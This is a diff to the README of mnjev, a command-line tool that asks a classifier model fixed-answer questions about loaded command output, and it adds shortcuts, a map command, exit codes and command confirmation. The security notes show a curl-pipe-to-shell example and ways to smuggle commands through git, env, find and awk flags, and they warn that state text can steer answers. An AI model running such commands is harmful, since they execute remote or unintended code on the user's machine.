@@ -14,13 +14,17 @@ whose possible answers are fixed in advance, and it returns one of those answers
 calibrated probability. So this is not a chatbot, it is a decision tool.
 
 ```
-› /run git --version
-  captured 35 chars from git --version
-› is this about version control?
-  yes  99%
+  › !git --version
+  $ git --version · 35 chars
+  › is this about version control?
+  ● yes  99% sure
     yes  ████████████████████  99%
     no   ░░░░░░░░░░░░░░░░░░░░   1%
   1941ms
+╭──────────────────────────────────────────────────────────────────────────╮
+│ ›
+╰──────────────────────────────────────────────────────────────────────────╯
+  $ git --version · 35 chars · tab completes
 ```
 
 ## Install
@@ -115,12 +119,73 @@ State is what Jev reads. Load it when the question is about your own code or dat
 | `/set <text>` | type the state in directly |
 | `/load <file>` | use a file as state |
 | `/run <command>` | use a command's output as state |
+| `!<command>` | shorthand for `/run` |
+| `@<file>` | pull a file into one question, without changing the state |
 | `/state` | show what is loaded |
 | `/clear` | drop the state |
+| `/cost` | requests, tokens, and dollars for the session |
 | `/help` `/exit` | |
 
 `/run` keeps the output of a command that fails, so `/run npm test` on a broken suite
 loads the failure for you to ask about.
+
+**State sticks until you change it.** Once loaded it is sent with *every* question
+after it, not just the next one. Jev gets less accurate as unrelated text grows, so stale
+state is its worst failure mode. Two things guard against forgetting: the line under the
+input box always names what is loaded, and every answer ends with what it was judged
+against.
+
+```
+  › can penguins swim?
+  ● yes  97% sure
+  464ms · judged against $ git log --oneline -10    <- nothing to do with penguins
+```
+
+Run `/clear` when you see that. Use `@<file>` instead of `/load` when you only want the
+file for one question.
+
+**Pasting several lines makes them the state.** That is almost always what you wanted,
+and it saves you typing `/set` first. End a line with `\` to continue it onto the next.
+
+### The interface
+
+Tab completes commands and file paths. Typing `/` filters the command list under the
+box as you go. `ctrl-c` cancels whatever is running, whether that is a question in
+flight or a `/run` command, and `ctrl-c` on an empty line twice exits. History is kept
+in `~/.mnjev/history` and survives restarts. `/set` lines and pasted blocks are left out
+of that file, since both exist to carry content that may not belong on disk.
+
+A command is confirmed before it runs:
+
+```
+╭──────────────────────────────────────────────────────────────────────────╮
+│ Run a shell command?                                                     │
+│                                                                          │
+│   npm test                                                               │
+│                                                                          │
+│   1  yes                                                                 │
+│   2  yes, and stop asking for npm                                        │
+│   3  no                                                                  │
+╰──────────────────────────────────────────────────────────────────────────╯
+  1-3, enter for yes
+```
+
+Option 2 remembers the program for the rest of the session only. Nothing is written
+to disk, so a new session asks again.
+
+**A command containing shell syntax is always confirmed**, whatever you have allowed.
+`;`, `&&`, `|`, backticks and `$(...)` all run more than one program, so allowing `git`
+must not wave through `git log; curl example.com | sh`. Option 2 is not offered for
+those, and the box says so.
+
+**Option 2 trusts the program, not the arguments.** Allowing `git` allows anything `git`
+itself can be made to do, and plenty of tools can be made to run other programs through
+their own flags: `git -c alias.x=!cmd`, `env X=1 sh -c ...`, `find -exec`, `awk 'BEGIN{system(...)}'`.
+mnjev does not try to detect those. Every one of those lists is incomplete, and a check
+that catches four of them while missing forty is worse than an honest limit, because it
+reads like protection. The confirmation box exists so a command does not run by accident,
+not to sandbox a command you typed on purpose. Nothing in mnjev writes commands for you:
+Jev returns no text, so every command run here is one you typed.
 
 ### Ask several questions at once
 
@@ -129,7 +194,7 @@ Jev answers questions in parallel, so separate them with `;` and pay for one cal
 ```
 › is this a bug fix?; how risky is it? low|medium|high
   is this a bug fix?
-  no  57%
+  no  57% sure
     yes  █████████░░░░░░░░░░░  43%
     no   ███████████░░░░░░░░░  57%
   unsure - 50% means it has no idea
@@ -158,6 +223,72 @@ cat review.txt | mnjev score  "how angry is this person?" "calm|annoyed|furious"
 
 Add `--json` for the raw API response. `mnjev --help` exits 0; an unknown command exits 1,
 so scripts can tell a typo from an answer.
+
+### Classify a list
+
+`map` runs one question over every line of stdin and prints a tab-separated row per item:
+
+```bash
+git diff --name-only | mnjev map "does this file need a test?"
+```
+
+```
+src/auth/login.ts       yes     0.76
+README.md               no      0.84
+src/payments/charge.ts  yes     0.70
+.gitignore              no      0.82
+```
+
+The columns are the item, the answer, and the confidence, so `cut`, `awk`, and `grep`
+all work on it. `--json` gives one JSON object per line instead.
+
+It takes the same three question types as the one-shot form:
+
+```bash
+git log --format=%s -50 | mnjev map choice "what kind of change?" "fix,feature,chore"
+cat reviews.txt        | mnjev map score  "how angry?" "calm|annoyed|furious"
+```
+
+**Each line is its own state, so each line is its own call.** Jev's batching makes many
+questions about *one* state cheap, not one question about many states, so `map` cannot
+make 50 items cost less than 50 calls. What it does is run them at the same time:
+
+| 16 items | time |
+|---|---|
+| one at a time | 6.8s |
+| 8 in flight (default) | **1.7s** |
+
+`JEV_CONCURRENCY` sets how many run at once.
+
+Batching *does* apply when you ask several questions about each item. Separate them with
+`;` and each item still costs one call:
+
+```bash
+git log --format=%s -50 | mnjev map "is this a bug fix?; is this risky?"
+```
+
+### Exit codes for scripts
+
+The confidence is the point of Jev, so `--exit-code` puts it where a script can act on it
+instead of making you parse the text:
+
+| code | meaning |
+|---|---|
+| `0` | yes, above the confidence floor |
+| `2` | no, above the confidence floor |
+| `3` | below the floor, or none of your options fit |
+| `1` | the command itself failed |
+
+```bash
+if cat err.log | mnjev noul "is this a database problem?" --exit-code; then
+  page-the-dba
+fi
+```
+
+With `--exit-code`, `map` exits `3` if any row came back below the floor, so a batch that
+needs a human look can fail a CI step. Without the flag it exits `0`, so a plain `map` in
+a pipeline never fails a script by surprise. An item that errored exits `1` either way,
+because a network or auth failure is not low confidence.
 
 ### Say what you are comparing on
 
@@ -188,7 +319,7 @@ It judges the state you give it:
 ```
 › /run date
 › is this year 2027?
-  no  100%
+  no  100% sure
 ```
 
 It does know things, though, so plenty of questions need no state at all:
@@ -237,6 +368,20 @@ Every probability Jev returns is shown, on every call:
     coffee  ████████████████████  98%
     tea     ░░░░░░░░░░░░░░░░░░░░   2%
 ```
+
+**The confidence is not the winner's own probability.** For a choice it tracks how far
+ahead the winner is, so 98% against 2% is a confidence of 96%, and a near tie is near
+zero:
+
+```
+  email  confidence 2%
+    email  ██████████░░░░░░░░░░  51%
+    chat   ██████████░░░░░░░░░░  49%
+  unsure - try clearer options, or more context
+```
+
+Email "won" and the answer is worth nothing. The bar says which option came first; the
+confidence says whether that was a decision. Read the confidence.
 
 A choice is ranked by probability. A score keeps its scale order, because for a score the
 order is the meaning. Answers below `0.7` turn yellow and are marked `unsure`; confident
@@ -296,6 +441,8 @@ typo cannot silently switch a safety feature off.
 | `JEV_TIMEOUT_MS` | `30000` | give up on a request after this long; 1000 to 600000 |
 | `JEV_RETRIES` | `3` | retries after a rate limit or gateway error; 0 to 10 |
 | `JEV_RETRY_BASE_MS` | `500` | first backoff delay; each retry doubles it |
+| `JEV_CONCURRENCY` | `8` | items `map` keeps in flight at once; 1 to 32 |
+| `JEV_PASTE_MS` | `12` | lines arriving within this window count as one paste; 1 to 500 |
 | `NO_COLOR` | unset | any value turns colour off |
 
 A `429`, `529`, or `502`/`503`/`504` is retried with doubling backoff and jitter,
@@ -311,8 +458,8 @@ From TypeSafe's own [known issues](https://docs.typesafe.ai/model-jaggedness/jev
 - **Dates.** It reads dates as text, not as ordered values. Compare dates yourself.
 - **Literal reading.** It answers the question you wrote, not the one you meant.
 - **Big irrelevant state.** Accuracy falls as unrelated content grows. This is why `/run`
-  exists: send the 20 lines that matter, not the whole log. The REPL warns above 24,000
-  characters.
+  exists: send the 20 lines that matter, not the whole log. State above 24,000 characters
+  is refused rather than sent, on every path including pipes.
 - **Untrusted input.** It does not treat state as hostile. Text inside your state can
   steer the answer, so do not pipe in content you would not trust.
 
